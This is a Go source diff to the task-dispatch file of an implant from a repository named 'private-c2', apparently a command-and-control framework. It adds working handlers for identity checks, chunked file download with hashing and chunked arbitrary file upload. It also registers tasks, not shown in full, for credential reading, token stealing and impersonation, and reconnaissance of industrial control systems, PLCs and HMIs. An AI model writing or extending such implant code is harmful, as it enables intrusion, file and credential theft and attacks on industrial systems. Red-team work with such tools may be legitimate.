@@ -2,15 +2,19 @@ package main
 
 import (
 	"context"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
 	"os"
 	"os/exec"
+	"os/user"
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/azizbinmohammad/private-c2/implant/modules/network"
 	"github.com/azizbinmohammad/private-c2/implant/modules/nmap"
@@ -25,26 +29,52 @@ import (
 type taskHandler func(ctx context.Context, args string) (string, error)
 
 var taskHandlers = map[string]taskHandler{
-	protocol.TaskShell:      handleShell,
-	protocol.TaskLS:         handleLS,
-	protocol.TaskPwd:        handlePwd,
-	protocol.TaskCd:         handleCd,
-	protocol.TaskPS:         handlePS,
-	protocol.TaskCat:        handleCat,
-	protocol.TaskUpload:     handleUpload,
-	protocol.TaskDownload:   handleDownload,
-	protocol.TaskScreenshot: handleScreenshot,
-	protocol.TaskNmap:       handleNmap,
-	protocol.TaskScan:       handleScan,
-	protocol.TaskMkdir:      handleMkdir,
-	protocol.TaskRm:         handleRm,
-	protocol.TaskCp:         handleCp,
-	protocol.TaskMv:         handleMv,
-	protocol.TaskKill:       handleKill,
-	protocol.TaskIfconfig:   handleIfconfig,
-	protocol.TaskNetstat:    handleNetstat,
-	protocol.TaskPortscan:   handlePortscan,
-	protocol.TaskResolve:    handleResolve,
+	protocol.TaskWhoami:           handleWhoami,
+	protocol.TaskGetuid:           handleGetuid,
+	protocol.TaskGetgid:           handleGetgid,
+	protocol.TaskDownloadStat:     handleDownloadStat,
+	protocol.TaskDownloadChunk:    handleDownloadChunk,
+	protocol.TaskUploadChunk:      handleUploadChunk,
+	protocol.TaskOTDiscover:       handleOTDiscover,
+	protocol.TaskOTFingerprint:    handleOTFingerprint,
+	protocol.TaskOTVulnScan:       handleOTVulnScan,
+	protocol.TaskOTHMI:            handleOTHMI,
+	protocol.TaskOTHistorian:      handleOTHistorian,
+	protocol.TaskOTWireless:       handleOTWireless,
+	protocol.TaskOTSerial:         handleOTSerial,
+	protocol.TaskOTPLCRead:        handleOTPLCRead,
+	protocol.TaskOTCredentials:    handleOTCredentials,
+	protocol.TaskCredentialEnum:   handleCredentialEnum,
+	protocol.TaskCredentialRead:   handleCredentialRead,
+	protocol.TaskProcessInfo:      handleProcessInfo,
+	protocol.TaskProcessSuspend:   handleProcessSuspend,
+	protocol.TaskProcessResume:    handleProcessResume,
+	protocol.TaskTokenList:        handleTokenList,
+	protocol.TaskTokenSteal:       handleTokenSteal,
+	protocol.TaskTokenMake:        handleTokenMake,
+	protocol.TaskTokenImpersonate: handleTokenImpersonate,
+	protocol.TaskTokenRevert:      handleTokenRevert,
+	protocol.TaskGetprivs:         handleGetprivs,
+	protocol.TaskShell:            handleShell,
+	protocol.TaskLS:               handleLS,
+	protocol.TaskPwd:              handlePwd,
+	protocol.TaskCd:               handleCd,
+	protocol.TaskPS:               handlePS,
+	protocol.TaskCat:              handleCat,
+	protocol.TaskUpload:           handleUpload,
+	protocol.TaskDownload:         handleDownload,
+	protocol.TaskScreenshot:       handleScreenshot,
+	protocol.TaskNmap:             handleNmap,
+	protocol.TaskScan:             handleScan,
+	protocol.TaskMkdir:            handleMkdir,
+	protocol.TaskRm:               handleRm,
+	protocol.TaskCp:               handleCp,
+	protocol.TaskMv:               handleMv,
+	protocol.TaskKill:             handleKill,
+	protocol.TaskIfconfig:         handleIfconfig,
+	protocol.TaskNetstat:          handleNetstat,
+	protocol.TaskPortscan:         handlePortscan,
+	protocol.TaskResolve:          handleResolve,
 }
 
 var networkModule = network.NewModule(nil)
@@ -71,6 +101,33 @@ func executeShell(ctx context.Context, cmdStr string) (string, error) {
 
 func handleShell(ctx context.Context, args string) (string, error) {
 	return executeShell(ctx, args)
+}
+
+func handleWhoami(_ context.Context, _ string) (string, error) {
+	current, err := user.Current()
+	if err != nil {
+		return "", err
+	}
+	if current.Username != "" {
+		return current.Username, nil
+	}
+	return current.Uid, nil
+}
+
+func handleGetuid(_ context.Context, _ string) (string, error) {
+	uid, err := getuid()
+	if err != nil {
+		return "", err
+	}
+	return strconv.Itoa(uid), nil
+}
+
+func handleGetgid(_ context.Context, _ string) (string, error) {
+	gid, err := getgid()
+	if err != nil {
+		return "", err
+	}
+	return strconv.Itoa(gid), nil
 }
 
 func handleLS(_ context.Context, args string) (string, error) {
@@ -138,7 +195,159 @@ func handleDownload(_ context.Context, args string) (string, error) {
 	if err != nil {
 		return "", err
 	}
+	if agentSafety != nil {
+		if check := agentSafety.CheckDataQuota(int64(len(data))); !check.Passed {
+			return "", fmt.Errorf("download refused: %s", check.Reason)
+		}
+	}
 	return base64.StdEncoding.EncodeToString(data), nil
+}
+
+func hashFile(path string) (string, error) {
+	f, err := os.Open(path)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+	h := sha256.New()
+	if _, err := io.Copy(h, f); err != nil {
+		return "", err
+	}
+	return hex.EncodeToString(h.Sum(nil)), nil
+}
+
+func handleDownloadStat(_ context.Context, args string) (string, error) {
+	path := strings.TrimSpace(args)
+	if path == "" {
+		return "", fmt.Errorf("download_stat requires a path")
+	}
+	info, err := os.Stat(path)
+	if err != nil {
+		return "", err
+	}
+	digest, err := hashFile(path)
+	if err != nil {
+		return "", err
+	}
+	return marshalJSON(struct {
+		Path    string `json:"path"`
+		Size    int64  `json:"size"`
+		Mode    string `json:"mode"`
+		ModTime string `json:"mod_time"`
+		SHA256  string `json:"sha256"`
+	}{path, info.Size(), info.Mode().String(), info.ModTime().UTC().Format(time.RFC3339), digest})
+}
+
+const maxDownloadChunk = 4 << 20
+
+func handleDownloadChunk(_ context.Context, args string) (string, error) {
+	var req struct {
+		Path   string `json:"path"`
+		Offset int64  `json:"offset"`
+		Length int    `json:"length"`
+	}
+	if err := json.Unmarshal([]byte(args), &req); err != nil {
+		req.Path = strings.TrimSpace(args)
+	}
+	if req.Path == "" {
+		return "", fmt.Errorf("download_chunk requires a path")
+	}
+	if req.Offset < 0 {
+		return "", fmt.Errorf("download_chunk offset must be non-negative")
+	}
+	if req.Length <= 0 || req.Length > maxDownloadChunk {
+		req.Length = 1 << 20
+	}
+
+	info, err := os.Stat(req.Path)
+	if err != nil {
+		return "", err
+	}
+	if req.Offset > info.Size() {
+		return "", fmt.Errorf("download_chunk offset %d is past end of file (%d)", req.Offset, info.Size())
+	}
+
+	f, err := os.Open(req.Path)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+
+	buf := make([]byte, req.Length)
+	n, readErr := f.ReadAt(buf, req.Offset)
+	if readErr != nil && readErr != io.EOF {
+		return "", readErr
+	}
+	chunk := buf[:n]
+	if agentSafety != nil {
+		if check := agentSafety.CheckDataQuota(int64(len(chunk))); !check.Passed {
+			return "", fmt.Errorf("download refused: %s", check.Reason)
+		}
+	}
+	return marshalJSON(struct {
+		Data   string `json:"data"`
+		Offset int64  `json:"offset"`
+		Length int    `json:"length"`
+		Size   int64  `json:"size"`
+		EOF    bool   `json:"eof"`
+	}{
+		Data:   base64.StdEncoding.EncodeToString(chunk),
+		Offset: req.Offset,
+		Length: n,
+		Size:   info.Size(),
+		EOF:    req.Offset+int64(n) >= info.Size(),
+	})
+}
+
+func handleUploadChunk(_ context.Context, args string) (string, error) {
+	var req struct {
+		Path     string `json:"path"`
+		Offset   int64  `json:"offset"`
+		Data     string `json:"data"`
+		Truncate bool   `json:"truncate"`
+	}
+	if err := json.Unmarshal([]byte(args), &req); err != nil {
+		return "", fmt.Errorf("upload_chunk args must be JSON: %w", err)
+	}
+	if req.Path == "" {
+		return "", fmt.Errorf("upload_chunk requires a path")
+	}
+	if req.Offset < 0 {
+		return "", fmt.Errorf("upload_chunk offset must be non-negative")
+	}
+	data, err := base64.StdEncoding.DecodeString(req.Data)
+	if err != nil {
+		return "", fmt.Errorf("decode upload_chunk data: %w", err)
+	}
+
+	flags := os.O_CREATE | os.O_WRONLY
+	if req.Truncate {
+		flags |= os.O_TRUNC
+	}
+	f, err := os.OpenFile(req.Path, flags, 0644)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+	if _, err := f.Seek(req.Offset, io.SeekStart); err != nil {
+		return "", err
+	}
+	if _, err := f.Write(data); err != nil {
+		return "", err
+	}
+	return marshalJSON(struct {
+		Path   string `json:"path"`
+		Bytes  int    `json:"bytes"`
+		Offset int64  `json:"offset"`
+	}{req.Path, len(data), req.Offset})
+}
+
+func marshalJSON(v any) (string, error) {
+	data, err := json.Marshal(v)
+	if err != nil {
+		return "", err
+	}
+	return string(data), nil
 }
 
 func handleScreenshot(ctx context.Context, args string) (string, error) {
